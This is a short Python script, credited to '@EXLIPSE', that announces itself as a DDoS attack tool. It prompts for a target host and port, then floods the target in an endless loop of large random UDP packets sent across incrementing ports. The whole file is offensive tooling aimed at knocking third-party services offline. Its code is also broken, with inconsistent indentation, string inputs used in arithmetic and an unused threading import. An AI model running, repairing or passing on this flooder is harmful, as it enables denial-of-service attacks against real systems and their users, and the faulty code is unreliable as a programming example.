#import
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from datetime import datetime

#Warna Untuk Tools
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'

#Waktu
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

os.system("clear")
os.system("figlet DDos Attack")
print
print (yellow+b+"\033[1;91m[ Author   : @EXLIPSE#1334]"+b+yellow)
print (yellow+b+"\033[1;91m[Code : @EXLIPSE]"+b+yellow)
print (pink+b+"\033[1;91m[Instagram   : @EXLIPSE]"+b+pink)
print (pink+b+"\033[1;91m[Facebook : https://www.facebook.com/@EXLIPSE]"+b+pink)
print (yellow+b+"\033[1;91m[Discord : JendralEclipse#1334]"+b+yellow)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(65534)
host = input(yellow+b+"Enter Attack Host Target : "+b+yellow)
port = input(yellow+b+"Enter Attack Port Target      : "+b+yellow)
sent = input(yellow+b+"Masukan Jumlah Packet:"+b+yellow)
thread = input(yellow+b+"Masukan Jumlah Thread:"+b+yellow)

os.system("clear")
os.system("figlet Attack Starting")
print (cyan+b+"\033[1;91m[ xxx>                   ] 0%"+b+cyan)
time.sleep(5)
print ("[ xxxxxxx>            ] 25%")
time.sleep(5)
print ("[xxxxxxxxxx>>          ] 50%")
time.sleep(5)
print ("[xxxxxxxxxxxxx>>     ] 75%")
time.sleep(5)
print ("[xxxxxxxxxxxxxxxxx>>] 100%")
time.sleep(3)
os.system("clear")
sent = 0
while True:
		sock.sendto(bytes, (host, port))
		sent = sent + 1
		port = port + 1
		thread = thread + 1
        print("ECLIPSE : Sent Attack To %s packet to %s Thread Packet %s Target port:%s"%(sent,host,port,thread))
     if port == 65534:
         port = 1
     if sent == 65534:
         sent = 1
     if thread == 65534:
         thread = 1